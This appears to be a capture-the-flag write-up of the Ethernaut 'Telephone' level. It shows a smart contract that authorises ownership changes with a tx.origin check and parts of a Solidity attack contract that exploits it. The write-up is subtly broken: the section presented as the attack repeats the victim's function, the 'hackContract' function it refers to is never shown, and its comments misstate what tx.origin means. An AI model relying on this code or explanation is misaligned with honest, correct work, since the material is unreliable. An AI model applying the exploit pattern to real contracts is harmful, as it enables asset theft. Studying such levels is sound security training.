# Telephone challenge - Level 4
```yml
This smart contract has a vulnerability, it's use of tx.origin as authorization is a vulnerability because:
```
- if msg.sender is not tx.origin address _owner will equal owner.

```Solidity
/** 
* @notice function changeOwner() uses tx.origin to change ownership 
* to whatever address calls this function just as long as it is not the 
* address that started the original transaction that created this contract 
*/
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

## 💥 The attack contract in detail

```yml 
The attack contract starts with importing the victim contract:
```
- this will be used in the attack contract's constructor,

```Solidity
// SPDX-License-Identifier: MIT
// fixed pragma
pragma solidity 0.6.0;

import "./Telephone.sol";

/// @title attack contract, assumes ownership
/// @author Web3 Blockchain Developer
contract TelephoneHack {
```

- the constructor receives the victim contract address from the player and references the victim contract with Telephone(_address), this address is assigned as the state variable telContract,

```Solidity
/// @notice state variable assigned in constructor
Telephone telContract;

/** 
* @notice victim address belonging to Telephone contract assigned as
* state variable telContract during deployment of attack contract 
*/
    constructor(address _address) public {
        telContract = Telephone(_address);
    }
```
- finally the attack begins,
- if msg.sender is not tx.origin address _owner will equal owner,
  - the player calls the changeOwner function to assume ownership and win.

```Solidity
/** 
* @notice function changeOwner() uses tx.origin to change ownership 
* to whatever address calls this function just as long as it is not the 
* address that started the original transaction that created this contract 
*/
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

## 💥 The attack contract locked and loaded in REMIX IDE

```yml
Click hackContract button to initiate the attack:
```

- lower left of the image, under the Deployed Contracts section 

<p align="left" >
<img width="512" height="512" src="https://user-images.githubusercontent.com/104662990/199756044-16a699f2-5111-4dfe-a25f-fac81cd4b1ab.png">
</P>
